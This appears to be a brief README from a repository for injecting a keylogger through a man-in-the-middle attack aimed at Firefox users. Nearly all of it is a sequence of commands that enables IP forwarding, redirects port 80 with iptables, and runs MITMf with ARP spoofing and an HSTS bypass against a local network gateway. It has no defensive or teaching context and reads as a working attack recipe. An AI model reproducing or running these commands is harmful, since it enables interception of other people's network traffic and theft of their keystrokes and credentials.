# Keylogger-al-t-rma---Mitmf-
For mozila (not chrome)

Dns
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A PREROUTING -p tcp -i eth0 --dport 80 -j REDIRECT --to-port 10000
mitmf -i eth0 -l 10000 --arp --spoof --hsts --gateway <modem_ip>

